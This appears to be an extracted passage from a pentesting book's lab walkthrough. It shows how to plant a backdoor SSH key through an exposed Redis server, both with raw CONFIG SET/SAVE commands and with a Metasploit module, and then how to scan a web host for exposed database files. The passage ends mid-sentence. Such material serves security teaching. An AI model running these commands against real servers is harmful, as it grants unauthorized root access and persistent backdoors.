@@ -1,0 +1,142 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 5 - Issue a SAVE command to save the contents.
+In this section, we’ll compromise Redis by using two methods: sending it raw Redis commands and using a Metasploit auxiliary module. Our goal is to add a backdoor SSH key on c-redis-01.
+Security Relevance Score: 11
+Word Count: 1181
+Extracted: 2025-06-13 23:40:57
+
+---
+
+Issue a SAVE command to save the contents.
+In this section, we’ll compromise Redis by using two methods: sending it raw Redis commands and using a Metasploit auxiliary module. Our goal is to add a backdoor SSH key on c-redis-01.
+
+Raw CLI Commands
+As when exploiting the MariaDB database, we’ll establish a local port forward by using SSH to send traffic destined for c-redis-01 through an intermediate host. This lets us make use of Kali’s tools. Run the following command on Kali to open port 6379 locally. We’ll tunnel the traffic via p-jumpbox-01 (172.16.10.13) to c-redis-01 (10.1.0.14) on port 6379:
+$ ssh -v -N -L 6379:10.1.0.14:6379 backup@172.16.10.13
+Let’s verify that port 6379 is listening locally on Kali:
+$ netstat -atunp | grep 6379
+Next, run the redis-cli command on Kali to open a Redis console and send instructions to the Redis server:
+$ redis-cli -h 127.0.0.1 -p 6379
+We’ll run the CONFIG SET dir Redis command to set the directory in which to write our public key on the Redis server:
+127.0.0.1:6379> CONFIG SET dir /root/.ssh/
+OK
+
+We set dbfilename to authorized_keys. This will ensure that the final path where content will be written is /root/.ssh/authorized_keys:
+127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
+OK
+
+Now we’ll set a key (k1) by using SET followed by the public SSH key. Note that there are two newlines (\n\n) at the beginning and end of the public-key string so that the authorized_keys file format doesn’t get mangled:
+127.0.0.1:6379> SET k1 "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqfvIYYTDy
+Dr98DoutM74ThhUb+72vUDdhRl6Y+CKx3BksVTQ7pIWayRdUaUz/LDH2/ijYGTRcf6juv3yZB5V82x
+PbL/ApvKMFwaxrnipZEPOd4BI7EG32XBy5RhIxZXMoUrxtoiJ9QbeRJh6gw0o85ABJhFCbknhxQR14
+uiKN7cGaE/XtVBpUiEONczEaUHlJMq6GB/SSIrEXY4iP2p9TUwv0HbljVdE+nOdeKTUINNcnLAbvC6
+/dHwLJ/NAQ94Ch+eiGdQHauBBeO96JHtDlgYaz1/sq54FTYYJxci4fiDBmXGAG6xf34f9uyy7PugWd
+sr5O0XR/xRJAcGn2/CGil/wIa09YtpcrkEryO0p+WUg7no3PAuotcC/fgDSFAIZnLFFKUtmWJlXMjX
+wtOWn9hj61Mk5mT0VlkWopDnVsqXgKfHmWIJolZNdUBW/UHs4nAP+MUOOnNadxlZkKfKdzsaZHhVLM
+CLoS+IXVKIvMf6tiLuS5LLut6e1Y2wiQmOM= kali@kali\n\n"
+OK
+
+Finally, save the content by using the SAVE command:
+127.0.0.1:6379> SAVE
+OK
+
+If you don’t currently have an SSH key pair set up in Kali, run ssh-keygen -t rsa and follow the wizard to generate one. The public key will be available at /home/kali/.ssh/id_rsa.pub.
+Now we’ll try to SSH into the c-redis-01 server with the private key. We need to perform one more port forward so we can tunnel this SSH traffic via the jump host. We’ll listen locally on port 2222 and send traffic on port 22:
+$ ssh -v -N -L 2222:10.1.0.14:22 backup@172.16.10.13
+Verify that port 2222 is listening locally on Kali:
+$ netstat -atunp | grep 2222
+Now run an SSH client to connect to 10.1.0.14:
+$ ssh root@127.0.0.1 -p 2222 -i /home/kali/.ssh/id_rsa
+
+Linux c-redis-01.acme-infinity-servers.com 6.1.0-kali5-amd64 #1 SMP
+
+--snip--
+root@c-redis-01:~#
+
+Great! We’ve gained root SSH access to c-redis-01 by using some Redis tricks.
+
+
+Metasploit
+We can compromise Redis in a similar manner by using a Metasploit auxiliary module. Metasploit is a penetration-testing, vulnerability assessment, and exploitation platform written in the Ruby language and founded by H.D. Moore. It can perform many tasks, including deploying payloads.
+In this section, we’ll use Metasploit to exploit the Redis vulnerability. This should give you exposure to Metasploit and show you alternative exploitation methods. On Kali, start Metasploit by running the msfconsole command:
+$ msfconsole
+Next, use the Redis file_upload auxiliary module by running the use command followed by the path to the module:
+msf > use auxiliary/scanner/redis/file_upload
+The module requires a few options; run show options to see them:
+msf auxiliary(scanner/redis/file_upload) > show options
+
+Module options (auxiliary/scanner/redis/file_upload):
+
+Name                    Current Setting  Required  Description
+----                    ---------------  --------  -----------
+DISABLE_RDBCOMPRESSION  true             yes       Disable compression when saving if found...
+FLUSHALL                false            yes       Run flushall to remove all redis data be...
+LocalFile                                no        Local file to be uploaded
+PASSWORD                foobared         no        Redis password for authentication test
+RHOSTS                                   yes       The target host(s), see https://docs.
+                                                   metasploit.com/docs/using-metasploit/
+                                                   basics/using-metasploit.html
+RPORT                   6379             yes       The target port (TCP)
+RemoteFile                               no        Remote file path
+THREADS                 1                yes       The number of concurrent threads
+
+We’ve bolded the options you’ll need to set. The LocalFile option should point to the filepath containing the public key; RHOSTS should point to 127.0.0.1, where we’ve set up a local port forward; and RemoteFile should point to the remote filepath where LocalFile should be uploaded:
+msf auxiliary(scanner/redis/file_upload) > set LocalFile "/home/kali/.ssh/id_rsa.pub"
+LocalFile => /home/kali/.ssh/id_rsa.pub
+
+msf auxiliary(scanner/redis/file_upload) > set RemoteFile  "/root/.ssh/authorized_keys"
+RemoteFile => /root/.ssh/authorized_keys
+
+msf auxiliary(scanner/redis/file_upload) > set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+
+Finally, run the exploit with the run command:
+msf auxiliary(scanner/redis/file_upload) > run
+
+[+] 127.0.0.1:6379 - 127.0.0.1:6379  -- saved 564 bytes inside of redis DB at
+/root/.ssh/authorized_keys
+[*] 127.0.0.1:6379 - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+Now that the public key is in the root user’s authorized_keys file on c-redis-01, we can SSH into it through the local 2222 port, as we did earlier:
+$ ssh root@127.0.0.1 -p 2222 -i /home/kali/.ssh/id_rsa
+Using key-based authentication, we now have persistent root access to the Redis machine. Having root access will allow you to freely explore this machine and everything that it contains.
+
+
+
+Exposed Database Files
+Web servers such as Apache and nginx can be configured to serve web files from only specific directories or to serve only very specific file extensions, such as.html or.php. However, you may sometimes run into web applications that read from or write to files located in the same directory as the main web application. These could include configuration files (such as .conf, .env, and .ini files), simple database files such as SQLite, or even files containing credentials.
+When applications are programmed in this way, they risk exposing these sensitive files to unauthorized users. Clients able to guess filenames on the web server may encounter downloadable files that could contain sensitive information about the application or the underlying server.
+We have one more target to compromise: the c-db-01 machine (10.1.0.15). If you scan this host, you’ll see that only port 80 (HTTP) is open, indicating that it is running a web server. Let’s start a local port forward so we can run some scanning tools from Kali. We’ll listen on port 8888 locally and use port 80 as the target:
+$ ssh -v -N -L 8888:10.1.0.15:80 backup@172.16.10.13
+Verify that port 8888 is open by using netstat:
+$ netstat -atunp | grep 8888
+
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+
+tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      1151064/ssh
+--snip--
+
+Next, we’ll use dirsearch to search the website for any interesting pages or files. Be sure to run it for a few minutes so it can iterate through its database of possible web paths:
+$ dirsearch -u http://localhost:8888
+
+--snip--
+[21:30:47] 403 -  276B  - /.ht_wsr.txt
+[21:30:47] 403 -  276B  - /.htaccess.sample
+[21:30:47] 403 -  276B  - /.htaccess.save
+[21:30:48] 403 -  276B  - /.html
+[21:30:48] 403 -  276B  - /.htpasswds
+[21:30:48] 403 -  276B  - /.httr-oauth
+[21:30:48] 403 -  276B  - /.php
+[21:30:58] 200 -   4KB  - /adminer.php
+[21:31:05] 200 -  181B  - /database.sql
+[21:31:10] 200 -  10KB  - /index.html
+[21:31:22] 403 -  276B  - /server-status/
+[21:31:22] 403 -  276B  - /server-status
+[21:32:26] 301 -  315B  - /uploads  ->  http://localhost:8888/uploads/
+[21:32:27] 200 -  941B  - /uploads/
+
+As you can see, some pages returned HTTP response code 403 Forbidden, while a few returned 200 OK (namely, adminer.php, database.sql, index.html, and uploads).
+Open your local browser in Kali and navigate to http://localhost:8888/adminer.php to see what comes up. You should see a page similar to Figure 11-
